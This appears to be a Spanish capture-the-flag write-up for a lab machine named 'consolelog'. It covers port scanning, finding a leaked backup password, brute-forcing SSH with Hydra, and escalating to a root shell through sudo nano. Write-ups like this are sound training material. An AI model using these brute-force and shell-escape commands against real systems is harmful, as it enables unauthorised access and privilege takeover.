---
Maquina: consolelog
SO: Linux
Explotación: Análisis de imágenes y web
Escala_privs: Permisos sudo
Dificultad: Fácil
tags:
  - maquina
  - web_discovery
  - linux
  - escala_privs
  - ssh
  - web
  - fuerza_bruta
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sVC -Pn 172.17.0.2
```

![[Pasted image 20241104110701.png]]

Curiosa esta máquina, hay puertos abiertos no muy comunes.. Vamos primero a echar un ojo al puerto más común y con seguramente menos vulnerabilidades, el puerto 80.

![[Pasted image 20241104110820.png]]

No parece haber mucha información, ni siquiera en el código fuente. Pero por si acaso voy a realizar una búsqueda de subdirectorios.

![[Pasted image 20241104111007.png]]

Curioso documento... me hace sospechar lo de "lapassworddebackupmaschingonadetodas", sinceramente mucha confianza no me da.

Investigando un poco más he dado con lo siguiente, pero ya sabemos a que hace referencia.

![[Pasted image 20241104112234.png]]

Vamos a probar a hacer fuerza bruta al SSH con la passwd "lapassworddebackupmaschingonadetodas" a ver si así podemos intentar acceder

```bash
hydra -L ~/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -p lapassworddebackupmaschingonadetodas ssh://172.17.0.2 -t 16 -s 5000
```

Y parece ser que funciona ->

![[Pasted image 20241104112610.png]]

Pues vamos a probar a conectarnos.

```bash
ssh 172.17.0.2 -p 5000 -l lovely
```

![[Pasted image 20241104112742.png]]

Estamos dentro y con el usuario lovely. Ahora vamos a ver los permisos que tiene este usuario.

![[Pasted image 20241104112822.png]]

Pues vamos a ver si se puede escalar privs con nano.

![[Pasted image 20241104113032.png]]

Parece que si que podemos escalar privs... Estos son los pasos realizados:

```bash
sudo nano
^R^X #Esto es con la tecla ctrl + la letra
reset; sh 1>&0 2>&0 #Importante ejecutar todo el comando en la misma linea
```

Y listo otra máquina para la colección ;).




